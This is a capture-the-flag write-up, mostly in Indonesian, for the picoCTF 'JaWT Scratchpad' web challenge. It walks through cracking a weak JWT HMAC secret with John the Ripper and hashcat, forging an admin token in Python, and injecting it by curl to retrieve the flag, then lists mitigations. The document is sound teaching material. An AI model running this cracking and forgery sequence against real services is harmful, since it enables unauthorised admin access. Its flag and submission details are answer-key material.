# Writeup: JaWT Scratchpad (Challenge ID: 25)

- Platform: CyLab Security Academy (picoCTF)
- Category: Web Exploitation / JWT Weak HMAC Secret Cracking & Signature Forgery
- Difficulty: Medium (diff=2)
- Author: John Hammond
- Event: picoCTF 2019
- Points: 400
- Flag: `academy{jawt_was_just_what_you_thought_3ecb761a}` (Komunitas: `CTF{jawt_was_just_what_you_thought_3ecb761a}`)

---

## Problem Statement & Scope

Tantangan menguji keamanan implementasi token otentikasi berbasis JSON Web Token (JWT):
> *"Check the admin scratchpad!"*
> 
> Petunjuk:
> 1. *"What is that cookie?"*
> 2. *"Have you heard of JWT?"*

Aplikasi web menyediakan layanan scratchpad interaktif di mana pengguna dapat mendaftar dengan nama sembarang, menulis catatan, dan membaca kembali catatan tersebut. Namun terdapat akun istimewa bernama `admin` yang menyimpan catatan rahasia berisi flag. Akses ke scratchpad admin dibatasi melalui cookie otentikasi `jwt`. Lingkup pengujian mencakup dekonstruksi struktur token JWT, audit kriptografis algoritma penandatanganan (JWS), pemulihan kunci simetris (*HMAC secret recovery*), dan pemalsuan tanda tangan token (*signature forgery*).

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Arsitektur Standar JSON Web Token (RFC 7519 & RFC 7515):**
   - Token JWT terdiri dari tiga segmen berformat Base64URL yang dipisahkan titik:
     $$\text{JWT} = \text{Header} \parallel "." \parallel \text{Payload} \parallel "." \parallel \text{Signature}$$
   - Segmen Header mendefinisikan tipe token dan algoritma penandatanganan:
     $$\{\text{"typ"}: \text{"JWT"}, \text{"alg"}: \text{"HS256"}\}$$
   - Segmen Payload memuat klaim identitas sesi pengguna:
     $$\{\text{"user"}: \text{"<username>"}\}$$
   - Segmen Signature dihitung menggunakan algoritma HMAC-SHA256:
     $$\text{Signature} = \text{HMAC-SHA256}(\text{Header} \parallel "." \parallel \text{Payload}, \text{Secret})$$

2. **Kelemahan Kunci Simetris Lemah (CWE-327 / CWE-522):**
   - Mengacu pada standar NIST SP 800-115 (*Section 5.2: Cryptographic Mechanism Evaluation*), integritas token HMAC bergantung sepenuhnya pada entropi kunci rahasia (*shared secret*).
   - Penggunaan kata sandi kamus pendek (`ilovepico`) memungkinkan penyerang mengeksekusi serangan offline brute-force / dictionary attack tanpa memicu deteksi atau *rate limiting* pada server web target.
   - Setelah kunci simetris dipulihkan, penyerang memiliki otoritas yang setara dengan server penerbit token, memungkinkan pembuatan klaim palsu arbitrer (*arbitrary token forgery*).

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Inspeksi Cookie dan Dekode Token Klien:**
   - Masuk ke aplikasi web dengan nama pengguna `guest`.
   - Periksa cookie peramban untuk menemukan nilai `jwt`.
   - Dekode bagian header dan payload via Base64URL:
     - Header: `{"typ":"JWT","alg":"HS256"}`
     - Payload: `{"user":"guest"}`

2. **Cracking Kunci Rahasia Menggunakan John the Ripper:**
   Simpan token JWT ke berkas `jwt.txt` dan jalankan pemecah sandi berbasis kamus `rockyou.txt`:
   ```bash
   john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
   ```
   Atau menggunakan Hashcat:
   ```bash
   hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
   ```
   Kunci rahasia berhasil dipulihkan dalam beberapa detik:
   $$\text{Secret} = \texttt{ilovepico}$$

3. **Pemalsuan Token Admin (*Signature Forgery*):**
   Susun payload baru dengan identitas target:
   $$\{\text{"user"}: \text{"admin"}\}$$
   Hitung tanda tangan HMAC-SHA256 baru menggunakan secret `ilovepico` melalui Python atau CLI `jwt_tool`:
   ```python
   import hmac, hashlib, base64, json

   def b64url(d): return base64.urlsafe_b64encode(d).decode().rstrip('=')
   h = b64url(b'{"typ":"JWT","alg":"HS256"}')
   p = b64url(b'{"user":"admin"}')
   data = f"{h}.{p}".encode()
   sig = b64url(hmac.new(b"ilovepico", data, hashlib.sha256).digest())
   admin_jwt = f"{h}.{p}.{sig}"
   ```

4. **Injeksi Cookie dan Ekstraksi Flag:**
   Kirimkan permintaan HTTP GET ke endpoint scratchpad admin dengan menyertakan token tempaan:
   ```bash
   curl -s -b "jwt=$ADMIN_JWT" http://chatelaine.cylabacademy.net:PORT/ | grep -o 'academy{[^}]*}'
   ```
   Halaman menampilkan catatan rahasia admin berisi flag resmi:
   ```text
   academy{jawt_was_just_what_you_thought_3ecb761a}
   ```

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{jawt_was_just_what_you_thought_3ecb761a}`
- **Flag Format Komunitas:** `CTF{jawt_was_just_what_you_thought_3ecb761a}`
- **Verifikasi API CyLab:**
  Submisi HTTP POST langsung ke `/api/submissions/`:
  ```json
  {"challenge": 25, "flag": "academy{jawt_was_just_what_you_thought_3ecb761a}"}
  ```
  Status respons: `HTTP 201 Created` dengan `{"correct": true, "historical": false}`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Kompetensi Silabus LKS Cyber Security (Cryptographic Token Hardening):**
   - Pemahaman mendalam mengenai arsitektur JWT sangat krusial di modul Web Security LKS. Peserta wajib memahami perbedaan algoritma simetris (`HS256`) dan asimetris (`RS256`/`ES256`).
   - Mampu melakukan audit integritas token dan mengevaluasi kerentanan umum seperti *None Algorithm*, *Algorithm Confusion*, dan *Weak Key Dictionary Attack*.

2. **Hardening & Remediasi Defensif:**
   - **Tingkatkan Entropi Kunci Simetris:** Gunakan kunci dengan entropi kriptografis tinggi minimal 256 bit yang dihasilkan oleh Cryptographically Secure Pseudorandom Number Generator (CSPRNG), misalnya `openssl rand -hex 64`.
   - **Migrasi ke Kriptografi Kunci Publik (Asymmetric Signing):** Gunakan algoritma asimetris seperti `RS256` (RSA dengan SHA-256) atau `EdDSA` (Ed25519). Server penandatangan memegang private key yang terisolasi, sementara subsistem verifikasi hanya memerlukan public key sehingga kebocoran komponen verifikasi tidak memungkinkan pemalsuan token.
   - **Pencegahan Token Tampering:** Terapkan validasi ketat terhadap masa kedaluwarsa (`exp`), penerbit (`iss`), dan audiens (`aud`) pada setiap proses verifikasi klaim.
